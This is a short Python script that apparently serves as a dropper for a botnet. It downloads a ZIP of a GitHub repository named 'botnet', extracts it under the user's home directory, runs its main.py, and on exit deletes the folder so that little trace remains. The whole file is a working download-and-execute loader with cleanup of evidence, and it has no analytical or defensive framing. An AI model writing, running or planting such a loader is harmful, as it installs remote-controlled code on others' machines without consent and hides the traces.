import atexit
import os
import subprocess
import shutil
import sys
import urllib.request
import zipfile
from pathlib import Path

home_dir = Path.home()
working_dir = home_dir / "temp_folder"
github_zip_url = "https://github.com/VinceDriesen/botnet/archive/refs/heads/main.zip" 

def main():
    zip_filepath = working_dir / "repo_download.zip"
    working_dir.mkdir(parents=True, exist_ok=True)

    urllib.request.urlretrieve(github_zip_url, str(zip_filepath))
    
    print("Extracting ZIP...")
    with zipfile.ZipFile(zip_filepath, 'r') as zip_ref:
        zip_ref.extractall(working_dir)
        
    extracted_folders = [
        item for item in os.listdir(working_dir) 
        if os.path.isdir(os.path.join(working_dir, item))
    ]
    
    repo_root = os.path.join(working_dir, extracted_folders[0])
    script_path = os.path.join(repo_root, "main.py")
    
    if os.path.exists(script_path):
        print(f"Executing {script_path}...")
        subprocess.run([sys.executable, "main.py"], cwd=repo_root, check=True)


def cleanup_scripts():
    if working_dir and os.path.exists(working_dir):
        print(f"\nCleaning up: removing directory '{working_dir}'...")
        shutil.rmtree(working_dir)


atexit.register(cleanup_scripts)


if __name__ == "__main__":
    main()
